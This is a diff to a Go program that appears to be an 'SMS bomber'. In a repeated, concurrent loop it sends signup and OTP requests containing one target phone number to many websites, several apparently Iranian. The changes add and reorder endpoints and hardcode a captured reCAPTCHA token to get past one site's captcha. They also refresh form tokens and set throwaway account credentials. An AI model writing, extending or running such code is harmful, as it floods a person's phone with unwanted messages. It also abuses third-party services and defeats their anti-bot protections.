@@ -483,6 +483,15 @@ cookieJar, _ := cookiejar.New(nil)
 	for i := 0; i < repeatCount; i++ {
 		
 		
+		// caropex.com (JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				sendJSONRequest(c, ctx, "https://caropex.com/api/v1/user/login", map[string]interface{}{ 
+					"mobile": phone,
+				}, &wg, ch)
+			}
+		}(client)
 		// narsisbeauty.com 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
@@ -552,47 +561,33 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// miare.ir (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				sendJSONRequest(c, ctx, "https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{ 
-					"phone_number": phone,
-				}, &wg, ch)
-			}
-		}(client)
-
 		// pezeshket.com (JSON)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
-				sendJSONRequest(c, ctx, "https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
+				sendJSONRequest(c, ctx, "https://api.pezeshket.com/core/v1/auth/requestCodeByMobileV2", map[string]interface{}{
 					"mobileNumber": phone,
 				}, &wg, ch)
 			}
 		}(client)
 
-		// bitycle.com (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{
-					"phone": phone,
-				}, &wg, ch)
-			}
-		}(client)
-
-		// caropex.com (JSON)
+		// bitycle.com (JSON)   delete captcha❌
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
 			return func() {
-				sendJSONRequest(c, ctx, "https://caropex.com/api/v1/user/login", map[string]interface{}{ 
-					"mobile": phone,
-				}, &wg, ch)
+				payload := map[string]interface{}{
+					"first_name":             "کاربر", 
+					"g-recaptcha-response":       "03AFcWeA7Kjqyncl-yqP7O5kpLRzYMpOnkqk2ipXxcNNBCBl5-Tk705GSHDxuA6dKypAs4RejeD-HAoW1blo-yzNIaJzsIov2DJ2D-1Mw5IbbF7UzlEfnDfi1NbkOOo-IqEgsW55RylZhHAv4O4sAYp9nlTVl-HL29HPtlBJIi6jZGndn9FoyoI27UfUDGh57SA9DuIjYACATmdV7qMf7srIngSJtlLimO87-eW8jSJ1zGtm-I6-ndJ9mMF2Pn8dOJuCxK9cWw1CY6M2PqLK33TW1u2P9_gQm85185YqPnuAfbduGpF3oG98wCHapDVGLBguaLIyt0KaJzquJZUjp6WHnUPtQMBNxr4_2wXgH1nVfQU8tGeS1Ru27A5FG_yQAUAw40k_HPtO-WonRY-eOh-W3lYXN6oUiPsf1HPtOMyWzrdbHhDqnBRNhERebaiWDk35jJ0uZwmJ8sg0XtMtfEqxF7uCwwPqyAykXXIkiABxm3izdKntZ0OH4lBs-I4Ge-wx6GIXroG15bMSmkSmtKXpim7fG6lNlw7xIMVujmGH4KApQhOWoGZLpc_H5ELLN241naC5XwrYbZ3UVhxGr3sUgq-i2AFW1bKlD0yJcdwlC_gbiVPLwlLVn1D5K1OD9rP-fn9KeoBoxuBtXLlTmHTTX1GYoZG7v8HDqRhn0fyEKZeQUq7VZYjsuVR3kZwWNejVSndAkRNgEq7TPMVdS7fZYyB-1mGrRSO_IS7cVL4DbQuCHEVvoo31aqoY-OG7gooppUB8GXlyifZyQjUItyoaXsFR1yO6IUqv4P36EJZMOrxJVaHZSo9ITW8zW06ECAOF0GojmhzXuuVbe1YmaxvqZ1ezxQR2guVBOrzWyuaW19Hdc6exe5ttakofO84vfGm0exyXNmsGy4wfnSPmuwJZVJbFaCBe18FhZwsja4tfUJOoIOmknUsnhOtXjQOLAz0cRtDUK0B6e0q04oaLZpm__v3r2pkbwIycpM_87hy0n_nSkgDfCHo0-yvDysoSb37YAvMHI-8GuRfssFO4RoQcvkg9XTyb01_w", 
+					"invite_code":     "", 
+					"last_name":          "بدون نام", 
+					"password":            "monsmain",
+					"phone":            phone, 
+				}
+				sendJSONRequest(c, ctx, "https://api.bitycle.com/api/account/register", payload, &wg, ch)
 			}
 		}(client)
 
-		// bigtoys.ir - Variation 3 (Form)
+		// bigtoys.ir(Form)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
 			return func() {
@@ -601,22 +596,22 @@ cookieJar, _ := cookiejar.New(nil)
 				formData.Set("digt_countrycode", "+98")
 				formData.Set("phone", strings.TrimPrefix(phone, "0"))
 				formData.Set("email", "")
-				formData.Set("digits_reg_name", "abcdefghl")
-				formData.Set("digits_reg_password", "qzF8w7UAZusAJdg")
+				formData.Set("digits_reg_name", "monsmain")
+				formData.Set("digits_reg_password", "monsmain@")
 				formData.Set("digits_process_register", "1")
 				formData.Set("optional_email", "")
 				formData.Set("is_digits_optional_data", "1")
 				formData.Set("sms_otp", "")
 				formData.Set("otp_step_1", "1")
 				formData.Set("signup_otp_mode", "1")
-				formData.Set("instance_id", "a1512cc9b4a4d1f6219e3e2392fb9222")
+				formData.Set("instance_id", "336977930ed5775e9a1cfa3588d86e2b") //cheack
 				formData.Set("optional_data", "email")
 				formData.Set("action", "digits_forms_ajax")
 				formData.Set("type", "register")
 				formData.Set("dig_otp", "")
 				formData.Set("digits", "1")
 				formData.Set("digits_redirect_page", "//www.bigtoys.ir/")
-				formData.Set("digits_form", "3bed3c0f10")
+				formData.Set("digits_form", "32f7865dbe") //cheack
 				formData.Set("_wp_http_referer", "/")
 				formData.Set("container", "digits_protected")
 				formData.Set("sub_action", "sms_otp")
